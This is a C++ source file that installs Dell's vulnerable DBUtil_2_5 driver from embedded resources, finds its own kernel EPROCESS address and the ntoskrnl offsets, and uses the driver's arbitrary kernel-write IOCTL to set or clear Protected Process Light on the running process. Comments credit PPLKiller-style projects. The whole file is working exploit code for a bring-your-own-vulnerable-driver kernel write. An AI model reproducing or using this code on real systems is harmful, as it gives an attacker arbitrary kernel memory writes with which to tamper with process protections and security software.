// Inspiration from
// https://github.com/jbaines-r7/dellicious
// https://github.com/gijsh/PPLKiller/tree/feature-allow-ppl-protection
// https://github.com/RedCursorSecurityConsulting/PPLKiller
// https://www.elastic.co/security-labs/author/gabriel-landau

#include "singleheader.h"

// Locates our EPROCESS (kernel address)
static DWORD64 s_PEPROCESS = 0;
constexpr DWORD PROCESS_ACCESS_CANARY = ACCESS_SYSTEM_SECURITY | SYNCHRONIZE;
static PVOID FindEPROCESS() {
    BOOLEAN _;
    auto ntStatus = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &_);
    ASSERT(NT_SUCCESS(ntStatus));

    const auto pid = GetCurrentProcessId();

    // Create a handle to ourself
    auto hProcess = OpenProcess(PROCESS_ACCESS_CANARY, FALSE, pid);;
    ASSERT(NULL != hProcess);

    // Get a list of all handles on the system
    std::string buf{};
    do {
        buf.resize(buf.empty() ? 0x800'000 : (buf.size() * 2));
        ntStatus = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, &buf[0], (ULONG)buf.size(), NULL);
    } while (STATUS_INFO_LENGTH_MISMATCH == ntStatus);
    ASSERT(NT_SUCCESS(ntStatus));

    PVOID pProcess = nullptr;
    auto pInfo = (PSYSTEM_HANDLE_INFORMATION_EX)&buf[0];
    for (ULONG i = 0; i < pInfo->NumberOfHandles; i++) {
        const SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX& info = pInfo->Handles[i];
        // Find the entry that corresponds to the the handle we created above
        // It will have our PID, and the same handle value
        if ((pid == info.UniqueProcessId) && ((USHORT)(ULONG_PTR)hProcess == info.HandleValue))
        {
            // Save the address
            pProcess = info.Object;
            break;
        }
    }

    (void)CloseHandle(hProcess);

    ASSERT(NULL != pProcess);

    return pProcess;
}

static DWORD s_SignatureLevelOffset = 0;
static DWORD s_ProtectionOffset = 0;
static void FindVersionOffsets() {
    HMODULE hNtoskrnl = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    ASSERT(NULL != hNtoskrnl);

    // We can calculate the offset to Protection from the first instruction in PsGetProcessProtection
    auto PsGetProcessProtection = (PUCHAR)GetProcAddress(hNtoskrnl, "PsGetProcessProtection");
    ASSERT(NULL != PsGetProcessProtection);

    // mov al, [rcx+ProtectionOffset]
    ASSERT(0x818a == *(PUSHORT)PsGetProcessProtection);
    DWORD ProtectionOffset = ProtectionOffset = *(PDWORD)((PUCHAR)PsGetProcessProtection + 2);

    // Quick sanity check
    ASSERT((ProtectionOffset > 1024) && (ProtectionOffset < 4096));
    s_ProtectionOffset = ProtectionOffset;

    // We hard code SignatureLevel as preceeding Protection...
    //    +0x878 SignatureLevel   : UChar
    //    +0x87a Protection : _PS_PROTECTION
    s_SignatureLevelOffset = ProtectionOffset - (2 * sizeof(UCHAR));

    (void)FreeLibrary(hNtoskrnl);
}

static HANDLE s_hDBUtil = INVALID_HANDLE_VALUE;
static VOID InstallPPLDriver()
{
    // Use a driver that provides Administrators with an arbitrary kernel write.
    // According to Microsoft this is "by design" - and not a vulnerability.

    // Copy the chosen Dell driver package files from the embedded resources to the current path.
    const std::vector<std::pair<ULONG, std::wstring>> dropFiles =
    {
        { IDR_DBUtilDrv2_inf, L"DBUtilDrv2.inf" }, // INF first
        { IDR_DBUtilDrv2_cat, L"DBUtilDrv2.cat" },
        { IDR_DBUtilDrv2_sys, L"DBUtilDrv2.sys" },
        { IDR_WdfCoInstaller01009_dll, L"WdfCoInstaller01009.dll" },
    };

    wchar_t modulePath[MAX_PATH]{};
    (void)GetModuleFileNameW(nullptr, modulePath, _countof(modulePath));

    for (const auto& [resource, filename] : dropFiles) {
        const auto dropPath = std::filesystem::path(modulePath).parent_path() / filename;
        if (GetFileAttributesW(dropPath.c_str()) != INVALID_FILE_ATTRIBUTES)
            continue; // already exists - nothing to do.

        auto hResource = FindResourceW(NULL, MAKEINTRESOURCEW(resource), RT_RCDATA);
        auto resourceSize = SizeofResource(NULL, hResource);
        ASSERT(0 != resourceSize);

        auto hResourceData = LoadResource(NULL, hResource);
        auto pResource = LockResource(hResourceData);
        ASSERT(NULL != pResource);

        HANDLE hFile = CreateFileW(dropPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        ASSERT(INVALID_HANDLE_VALUE != hFile);

        DWORD bytesWritten = 0;
        ASSERT(WriteFile(hFile, pResource, resourceSize, &bytesWritten, NULL) && (bytesWritten == resourceSize));

        (void)CloseHandle(hFile);
    }

    // https://learn.microsoft.com/en-us/windows-hardware/drivers/install/overview-of-inf-files
    // The setup information (INF) file contains all of the information required to install a driver package.
    const auto infPath = std::filesystem::path(modulePath).parent_path() / dropFiles[0].second;

    GUID classGuid{};
    wchar_t className[32]{};
    ASSERT(SetupDiGetINFClassW(infPath.c_str(), &classGuid, className, _countof(className), nullptr));

    // Check if we are already installed.
    constexpr wchar_t DBUTIL_HARDWARE_ID[] = L"ROOT\\DBUtilDrv2";
    bool installed = false;

    auto hDeviceInfo = SetupDiGetClassDevsW(&classGuid, nullptr, nullptr, DIGCF_PRESENT);
    SP_DEVINFO_DATA deviceInfo = { sizeof(deviceInfo), };
    if (INVALID_HANDLE_VALUE != hDeviceInfo) {
        wchar_t hardwareId[64]{};
        for (DWORD i = 0; !installed && SetupDiEnumDeviceInfo(hDeviceInfo, i, &deviceInfo); i++) {
            if (!SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfo, SPDRP_HARDWAREID, nullptr, (PBYTE)hardwareId, sizeof(hardwareId), nullptr))
                continue;

            installed = (0 == wcscmp(hardwareId, DBUTIL_HARDWARE_ID));
        }
        (void)SetupDiDestroyDeviceInfoList(hDeviceInfo);
    }

    // Install, if required.
    if (!installed) {
        hDeviceInfo = SetupDiCreateDeviceInfoList(&classGuid, nullptr);
        ASSERT(INVALID_HANDLE_VALUE != hDeviceInfo);

        ASSERT(SetupDiCreateDeviceInfoW(hDeviceInfo, className, &classGuid, nullptr, nullptr, DICD_GENERATE_ID, &deviceInfo));
        ASSERT(SetupDiSetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfo, SPDRP_HARDWAREID, (BYTE*)DBUTIL_HARDWARE_ID, (DWORD)sizeof(DBUTIL_HARDWARE_ID)));
        ASSERT(SetupDiCallClassInstaller(DIF_REGISTERDEVICE, hDeviceInfo, &deviceInfo));

        BOOL rebootRequired = FALSE;
        ASSERT(UpdateDriverForPlugAndPlayDevicesW(nullptr, DBUTIL_HARDWARE_ID, infPath.c_str(), INSTALLFLAG_FORCE | INSTALLFLAG_NONINTERACTIVE, &rebootRequired));
    }

    // Store a handle to the device for use later.
    s_hDBUtil = CreateFileW(L"\\\\.\\DBUtil_2_5", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    ASSERT(INVALID_HANDLE_VALUE != s_hDBUtil);

    // Find our EPROCESS
    s_PEPROCESS = (DWORD64)FindEPROCESS();
    ASSERT(0 != s_PEPROCESS);

    // Determine EPROCESS offsets
    FindVersionOffsets();
    ASSERT(0 != s_SignatureLevelOffset);
    ASSERT(0 != s_ProtectionOffset);
}

// Dell driver arbitrary write byte primitive
constexpr DWORD IOCTL_DBUTIL_VA_WRITE = 0x9b0c1ec8;
#pragma pack(1)
struct DBUtilVaWriteByteData {
    uint64_t unused1;
    uint64_t address;
    uint64_t unused2;
    uint8_t byte;
};
static_assert(sizeof(DBUtilVaWriteByteData) == 25);

static void WriteByte(DWORD64 address, BYTE value) {
    ASSERT(INVALID_HANDLE_VALUE != s_hDBUtil);

    DBUtilVaWriteByteData writeByteMessage{};
    writeByteMessage.address = address;
    writeByteMessage.byte = value;

    DWORD bytesReturned = 0;
    auto buffer = &writeByteMessage;
    constexpr auto size = (DWORD)sizeof(DBUtilVaWriteByteData);

    ASSERT(DeviceIoControl(s_hDBUtil, IOCTL_DBUTIL_VA_WRITE, buffer, size, buffer, size, &bytesReturned, nullptr));

}

VOID EnablePPL() {
    if (INVALID_HANDLE_VALUE == s_hDBUtil) {
        InstallPPLDriver();
    }

    ASSERT(0 != s_PEPROCESS);
    ASSERT(0 != s_SignatureLevelOffset);
    ASSERT(0 != s_ProtectionOffset);

    // Antimalware-PPL
    constexpr BYTE SignatureAntimalware = (SeImageSignatureEmbedded << 4) | SE_SIGNING_LEVEL_ANTIMALWARE;
    WriteByte(s_PEPROCESS + s_SignatureLevelOffset, SignatureAntimalware);
    constexpr auto PsProtectedSignerAntimalware = 3;
    constexpr auto PsProtectedTypeProtectedLight = 1;
    constexpr BYTE ProtectionAntimalwareLight = (PsProtectedSignerAntimalware << 4) | PsProtectedTypeProtectedLight;
    WriteByte(s_PEPROCESS + s_ProtectionOffset, ProtectionAntimalwareLight);
}

VOID DisablePPL() {
    ASSERT(0 != s_PEPROCESS);
    ASSERT(0 != s_SignatureLevelOffset);
    ASSERT(0 != s_ProtectionOffset);

    WriteByte(s_PEPROCESS + s_SignatureLevelOffset, 0x00);
    WriteByte(s_PEPROCESS + s_ProtectionOffset, 0x00);
}
